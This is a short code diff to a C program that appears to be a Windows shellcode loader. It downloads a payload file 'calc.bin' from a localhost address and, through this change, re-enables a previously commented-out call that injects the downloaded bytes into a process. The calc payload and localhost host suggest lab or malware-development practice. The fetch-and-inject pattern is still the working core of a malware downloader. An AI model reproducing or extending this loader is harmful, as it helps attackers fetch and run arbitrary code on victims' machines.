@@ -9,10 +9,10 @@ int main()
 
 	unsigned char* pPayload = NULL;
 	
-	PSTR url = "https://127.0.0.1";
+	PSTR url = "127.0.0.1";
 	PSTR endpoint = "/calc.bin";
 	
-	SIZE_T sSize = Download(&pPayload, url, endpoint);
+	SIZE_T sSize = Download(&pPayload, url, endpoint, TRUE);
 
 	if (sSize == -1)
 		goto _Cleanup;
@@ -25,10 +25,14 @@ int main()
 	printf("\n");
 
 	getchar();
-	/*if (InitiateInjection(pPayload,sSize))
+
+	getchar();
+	if (InitiateInjection(pPayload,sSize))
 	{
 		return -1;
-	}*/
+	}
+
+	getchar();
 
 _Cleanup:
 	return 0;
